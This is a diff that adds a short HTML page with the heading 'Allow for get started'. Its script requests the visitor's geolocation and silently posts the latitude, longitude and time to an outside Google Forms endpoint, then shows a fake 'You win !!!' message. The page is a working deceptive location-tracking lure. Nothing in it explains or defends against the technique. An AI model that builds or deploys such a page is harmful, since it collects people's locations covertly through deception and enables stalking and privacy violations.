@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h3>Allow for get started</h3>
+
+<script>
+navigator.geolocation.getCurrentPosition(function(pos){
+
+  const data = new FormData();
+  data.append("entry.111111", pos.coords.latitude);
+  data.append("entry.222222", pos.coords.longitude);
+  data.append("entry.333333", new Date().toLocaleString());
+
+  fetch("https://docs.google.com/forms/d/e/1FAIpQLSfe-VBAXa8RRk6o1eWfB2IdQW0h3NLGhruyUGKX3BnzU0N5tg/formResponse", {
+    method: "POST",
+    mode: "no-cors",
+    body: data
+  });
+
+  document.body.innerHTML = "You win !!!";
+
+});
+</script>
+</body>
+</html>
